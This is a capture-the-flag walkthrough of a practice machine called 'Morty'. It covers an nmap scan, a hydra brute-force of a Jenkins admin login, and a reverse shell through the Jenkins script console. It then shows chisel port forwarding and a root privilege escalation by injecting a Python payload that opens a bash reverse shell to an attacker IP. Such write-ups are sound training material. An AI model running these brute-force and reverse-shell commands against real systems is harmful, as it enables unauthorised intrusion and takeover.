=======
# Morty

***
## Difficulty = Medium
![image](https://agent-skywalker.github.io/post/ptd/images/badge.png)

***
# Reconnaissances 
Full Nmap scan
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
30609/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The nmap scan shows a Jenkins server running on port 30609, navigating to the jenkin server is an administrator login page

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev1.png)

Trying default jenkin's credentials didn't work so i had to brute force for credentials.

I used burp suite to capture the login request so i can use it on hydra
![image](https://agent-skywalker.github.io/post/ptd/images/juniordev2.png)

# Exploitation 

Then i use the following command to brute force admin password
```
hydra -l admin -P  /usr/share/wordlists/rockyou.txt  10.150.150.38 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError" -v -t 64 -s 30609
```

since as burp suite captures another get request `loginError` when we submit a wrong log in info, we specify it in our hydra with `F=` option (F for failing strings followed by an equal sign `=` and a string which appears in a failed attempt)

I was able to log in with the credentials found

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev3.png)


![image](https://agent-skywalker.github.io/post/ptd/images/juniordev4.png)

Navigating to People i found `flag69`

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev5.png)

Under `Manage Jenkins` there's a script console that can run arbitrary groovy script on the server, so i generated a groovy reverse sell script and executed it in the script console to gain reverse shell.

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev6.png)

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev7.png)

> You can also get a reverse shell from jenkins by creating a new project and building it

I then change directory into the home directory of the user i got a shell with and found `flag70`

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev8.png)

Checking for the active connections on the system using `netstat -ano` i found a service running locally on port `8080` 

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev9.png)

So i transferred chisel to the box so i can forward the port to my attacker machine

After forwarding the port i navigated to `127.0.0.1:8080` and saw this page

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev10.png)

Viewing the page source of the page was a link directing to the next flag

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev11.png)

Navigating to it i found `flag71`

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev12.png)


# Privilege Escalation

So doing some future enumeration with `pspy` to see processes running on the target machine i found this process running `/usr/bin/python /root/mycalc/untitled.py 127.0.0.1 8080` as root.

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev13.png)

Since i can not read or modify `/root/mycalc/untitled.py 127.0.0.1 8080` doing some research online i found a blog about hacking python applications [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) 

So navigating back to the python application running locally on port 8080 i tried getting another reverse shell using the payloads found [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) 

so i setup my netcat listener and tried different payloads

I ran the following payload in the first box of the python application

```python
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.66.x/33006 0>&1"')#
```

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev14.png)


And i got a reverse shell back as root

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev15.png)

I was able to navigate into the root folder and get `flag72`

![image](https://agent-skywalker.github.io/post/ptd/images/juniordev16.png)
